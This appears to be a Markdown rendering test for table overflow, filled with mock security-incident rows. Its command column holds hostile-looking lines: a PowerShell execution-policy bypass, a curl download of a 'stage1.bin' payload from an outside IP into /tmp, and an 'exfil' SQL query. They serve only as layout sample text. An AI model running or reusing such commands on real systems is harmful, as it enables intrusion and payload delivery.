---
title: "Timestamp Range & Table Overflow Test"
subtitle: "Layout Verification for Unbreakable Ranges and Tight Monospace Tokens"
date: "2026-10-04"
lang: "en"
---

# Test 1: Standard Table with Timestamp Range

| Incident ID | Detection Timestamp Range | Affected Node | Ingress Command / Vector | Severity |
|:---|:---|:---|:---|:---|
| `INC-9901` | `2026-01-01T11:12:13-14:15:16` | `CORP-DC-01.internal` | `powershell.exe -ExecutionPolicy Bypass -NoProfile -Command "Get-Process"` | High |
| `INC-9902` | `2026-09-11 02:10:00 - 02:50:00` | `VPN-GW-02.perimeter` | `curl -sS http://198.51.100.44/stage1.bin -o /tmp/s1` | Critical |
| `INC-9903` | 2026-01-01T11:12:13-14:15:16 | `DB-SRV-01.local` | `SELECT * FROM sensitive_records WHERE exfil = 1` | Medium |

## Chronological Incident Timeline

| Event Timestamp (UTC) | Phase | Target Host | Detailed Observation & Indicator Context |
|:---|:---|:---|:---|
| `2026-01-01T11:12:13-14:15:16` | Discovery | `CORP-DC-01` | Reconnaissance query executed across active directory forest root domain. |
| `2026-09-11 02:10:00 - 02:50:00` | Exfiltration | `VPN-GW-02` | Archive streaming observed to remote destination IP address. |
